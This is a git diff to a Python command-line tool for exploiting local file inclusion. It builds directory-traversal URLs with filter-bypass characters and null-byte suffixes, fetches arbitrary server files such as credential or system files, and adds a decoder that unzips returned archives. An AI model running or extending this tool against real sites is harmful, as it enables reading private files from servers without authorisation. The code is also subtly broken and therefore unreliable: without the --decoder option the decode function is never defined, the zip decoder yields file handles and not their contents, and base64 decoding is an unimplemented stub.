@@ -1,6 +1,8 @@
 import click
 from colorama import Fore, Back, Style, init as colorama_init
 import requests
+import io
+import zipfile
 
 
 VERSION = "0.0.1"
@@ -25,12 +27,31 @@ def lfi():
     print(f"LFI Mode!")
 
 
+def zip_decoder(response):
+    with zipfile.ZipFile(io.BytesIO(response.content)) as zip_content:
+        for zipinfo in zip_content.infolist():
+            with zip_content.open(zipinfo) as unzipped_file:
+                yield zipinfo.filename, unzipped_file
+
+def base64_decoder(response):
+    print("Not implemented yet :(")
+    exit()
+
+def no_decoder(response):
+    yield "raw", response.text
+
+
+lfi_decoder_map = {"zip": zip_decoder, "b64d": base64_decoder}
+
+
+
 @lfi.command()
 @click.option("-i", "--injectable", help="The full target where the LFI is present. (ex. http://vuln.site/?download=)", required=True)
 @click.option("--filter-mode", help="Specify here if the target is somehow filtering injection. (Current options: 'spf')")
 @click.option("-s", "--suffix", help="Specify the suffix to be appended to the LFI payload. (e.g.: %00.pdf)", default="")
 @click.option("--repeat-prefix", help="Specify how many times to repeat injection characters. default = 5 (enough to traverse out of most default webroots)", default=5, type=click.types.INT)
-def interrogate(injectable, filter_mode, suffix, repeat_prefix):
+@click.option("--decoder", help="Use response decoder (e.g. zip) if the server returns the contents as something unexpected.")
+def interrogate(injectable, filter_mode, suffix, repeat_prefix, decoder):
     injection_char = lfi_modes_to_chars.get("default")
     if filter_mode:
         injection_char = lfi_modes_to_chars.get(filter_mode, None)
@@ -45,11 +66,18 @@ def interrogate(injectable, filter_mode, suffix, repeat_prefix):
             click.secho(f"{Fore.LIGHTYELLOW_EX}[LFI] {Fore.WHITE} Enter Filepath (from : /) {Style.RESET_ALL}", nl=False)
             filepath = input()
             # Prepare full url
-            target = f"{injectable}{injection_prefix}{filepath}"
+            target = f"{injectable}{injection_prefix}{filepath}{suffix}"
             click.secho(f"{Fore.LIGHTYELLOW_EX}[LFI] {Fore.LIGHTCYAN_EX} Trying to fetch: {Fore.LIGHTYELLOW_EX}{target}{Style.RESET_ALL}")
             with requests.Session() as _sess:
                 resp = _sess.get(target)
-                print(resp.text)
+                if decoder:
+                    decode_func = lfi_decoder_map.get(decoder, no_decoder)
+
+                for filename, result in decode_func(resp):
+                    click.secho(f"{Fore.LIGHTYELLOW_EX}[LFI] {Fore.WHITE}Found: {Fore.LIGHTCYAN_EX}{filename}")
+                    click.secho(f"{Fore.WHITE}{result}")
+                    click.secho("------------------------------------------------------------------------------")
+
     except KeyboardInterrupt:
         click.secho(f"{Fore.LIGHTRED_EX} [SYS] CTRL + C Caught, exiting!")
         exit()
